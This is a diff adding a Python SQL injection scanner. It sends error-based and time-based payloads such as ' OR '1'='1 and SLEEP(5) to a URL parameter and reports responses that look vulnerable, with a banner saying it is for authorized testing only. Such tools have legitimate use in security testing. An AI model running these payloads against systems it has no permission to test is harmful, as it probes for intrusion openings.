@@ -1,0 +1,112 @@
+#!/usr/bin/env python3
+"""
+SQL Injection Scanner
+Detects SQLi vulnerabilities using multiple techniques
+"""
+import requests
+import sys
+import time
+import urllib.parse
+import urllib3
+
+urllib3.disable_warnings()
+
+ERROR_PATTERNS = [
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "microsoft ole db provider for sql server",
+    "postgresql query failed",
+    "sqlite error",
+    "ora-01756",
+    "syntax error at or near",
+]
+
+PAYLOADS = {
+    "error_based": ["'", '"', "' OR '1'='1", "' OR '1'='1' --", "1' ORDER BY 1--+"],
+    "boolean_blind": ["' AND '1'='1", "' AND '1'='2", "1 AND 1=1", "1 AND 1=2"],
+    "time_based": ["' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' OR pg_sleep(5)--"],
+}
+
+def check_error_based(url, param):
+    """Test for error-based SQL injection"""
+    results = []
+
+    for payload in PAYLOADS["error_based"]:
+        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
+        try:
+            response = requests.get(test_url, verify=False, timeout=10)
+            text_lower = response.text.lower()
+
+            for pattern in ERROR_PATTERNS:
+                if pattern in text_lower:
+                    print(f"[+] Error-based SQLi detected with payload: {payload}")
+                    results.append({"type": "error", "payload": payload, "pattern": pattern})
+                    break
+
+        except Exception as e:
+            print(f"[-] Error testing payload: {e}")
+
+    return results
+
+def check_time_based(url, param, delay=5):
+    """Test for time-based blind SQL injection"""
+    results = []
+
+    for payload in PAYLOADS["time_based"]:
+        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
+        try:
+            start = time.time()
+            response = requests.get(test_url, verify=False, timeout=delay + 5)
+            elapsed = time.time() - start
+
+            if elapsed >= delay:
+                print(f"[+] Time-based SQLi detected! Response took {elapsed:.2f}s")
+                results.append({"type": "time", "payload": payload, "delay": elapsed})
+
+        except requests.exceptions.Timeout:
+            print(f"[+] Time-based SQLi likely - request timed out")
+            results.append({"type": "time", "payload": payload, "delay": "timeout"})
+        except Exception as e:
+            print(f"[-] Error: {e}")
+
+    return results
+
+def scan_url(url, param):
+    """Perform full SQLi scan on URL parameter"""
+    print(f"\n[*] Scanning {url} - Parameter: {param}")
+    print("-" * 60)
+
+    all_results = []
+
+    print("\n[*] Testing error-based injection...")
+    all_results.extend(check_error_based(url, param))
+
+    print("\n[*] Testing time-based injection...")
+    all_results.extend(check_time_based(url, param))
+
+    return all_results
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print(f"Usage: {sys.argv[0]} <url> <parameter>")
+        print("Example: python3 sqli_scanner.py http://target/page.php id")
+        sys.exit(1)
+
+    url = sys.argv[1]
+    param = sys.argv[2]
+
+    print("=" * 60)
+    print("SQL Injection Scanner - For Authorized Testing Only")
+    print("=" * 60)
+
+    results = scan_url(url, param)
+
+    print("\n" + "=" * 60)
+    if results:
+        print(f"[!] Found {len(results)} potential SQLi vulnerability(ies)!")
+        for r in results:
+            print(f"    - Type: {r['type']}, Payload: {r['payload']}")
+    else:
+        print("[-] No SQL injection vulnerabilities detected")
